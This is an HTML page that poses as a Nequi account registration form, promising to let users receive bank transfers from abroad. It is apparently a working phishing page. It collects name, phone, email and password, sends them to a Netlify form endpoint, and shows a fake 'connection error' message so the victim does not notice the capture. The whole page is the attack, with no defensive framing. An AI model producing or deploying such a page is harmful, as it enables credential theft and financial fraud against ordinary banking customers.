<!DOCTYPE html>
<html lang="es">
<head>
     <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <meta  data-hid="og:description" property="og:description" content="Recibir transferencias bancarias desde el extranjero">
    <meta property="og:image" content="tiko.jpg">
    <link href='icon.png' rel='icon' type='image/x-icon'/>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2D0320;
            color: #FFFFFF;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #3C0A3A;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
            width: 300px;
            text-align: center;
        }
        .container h2 {
            color: #F0A5D9;
            margin-top: 10px; /* Reducir el margen superior */
            margin-bottom: 10px; /* Reducir el margen inferior */
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
        }
        .form-group input[type="text"],
        .form-group input[type="email"],
        .form-group input[type="password"] {
            background-color: #5B0F58;
            color: #FFFFFF;
        }
        .btn {
            background-color: #E40373;
            color: #FFFFFF;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
        .btn:hover {
            background-color: #C9025E;
        }
        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 50px; /* Ajustar la altura para reflejar el tamaño del logo */
            margin-bottom: 20px;
            margin-top: 20px; /* Espacio entre la parte superior y el logo */
        }
        .logo {
            max-width: 100px; /* Reducir el tamaño máximo del logo */
            max-height: 50px; /* Reducir el tamaño máximo del logo */
            margin-top: 20px; /* Margen superior para el logo */
        }
        .alert {
            display: none;
            background-color: #FF4F4F;
            color: #FFFFFF;
            padding: 10px;
            border-radius: 5px;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1000;
            width: 300px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert" id="alert">¡Ha ocurrido un error de conexión, por favor inténtalo nuevamente!</div>
        <div class="logo-container">
            <img src="logo.png" alt="Logo" class="logo">
        </div>
        <h2>Registro de Nequi</h2>
        <p>Para recibir transferencias bancarias desde el extranjero, por favor registra tu Nequi.</p>
        <form id="registrationForm" name="contact" method="POST" data-netlify="true" action="/index">
            <div class="form-group">
                <label for="name">Nombre y Apellidos</label>
                <input type="text" id="name" name="name" required>
            </div>
            <div class="form-group">
                <label for="phone">Número de Teléfono</label>
                <input type="text" id="phone" name="phone" required>
            </div>
            <div class="form-group">
                <label for="email">Correo Electrónico</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Registrarse</button>
        </form>
    </div>
    <script>
        document.getElementById('registrationForm').addEventListener('submit', function(event) {
            event.preventDefault();
            document.getElementById('alert').style.display = 'block';
            setTimeout(() => {
                event.target.submit();
            }, 2000); // Adjust the delay time as needed (e.g., 2000 ms = 2 seconds)
        });
    </script>
</body>
</html>
